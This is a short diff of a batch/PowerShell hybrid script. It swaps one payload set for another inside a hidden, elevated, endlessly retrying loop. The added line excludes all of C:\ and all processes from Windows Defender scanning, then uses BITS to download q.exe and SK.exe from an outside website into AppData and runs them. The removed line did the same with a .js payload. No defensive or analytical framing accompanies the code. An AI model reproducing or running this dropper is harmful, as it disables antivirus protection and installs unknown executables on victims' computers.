@@ -7,7 +7,6 @@ powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'
 endlocal
 goto:eof
 #>
-while($true){try{Start-Process 'cmd' -WindowStyle Hidden -Verb runas -ArgumentList '/k powershell -command add-mppreference -exclusionpath C:\ && powershell -command add-mppreference -exclusionprocess C:\ && powershell Start-BitsTransfer -Source https://www.axxemotechnology.com/tmp/q.exe -Destination %USERPROFILE%\AppData\q.exe && powershell Start-Process -FilePath %USERPROFILE%\AppData\q.exe && powershell Start-BitsTransfer -Source https://www.axxemotechnology.com/tmp/v.js -Destination %USERPROFILE%\AppData\v.js && powershell Start-Process -FilePath %USERPROFILE%\AppData\v.js
+while($true){try{Start-Process 'cmd' -WindowStyle Hidden -Verb runas -ArgumentList '/k powershell -command add-mppreference -exclusionpath C:\ && powershell -command add-mppreference -exclusionprocess C:\ && powershell Start-BitsTransfer -Source https://www.axxemotechnology.com/assets/js/q.exe -Destination %USERPROFILE%\AppData\q.exe && powershell Start-Process -FilePath %USERPROFILE%\AppData\q.exe && powershell Start-BitsTransfer -Source https://www.axxemotechnology.com/assets/js/SK.exe -Destination %USERPROFILE%\AppData\SK.exe && powershell Start-Process -FilePath %USERPROFILE%\AppData\SK.exe
  /priv';exit}catch{}}
-
 
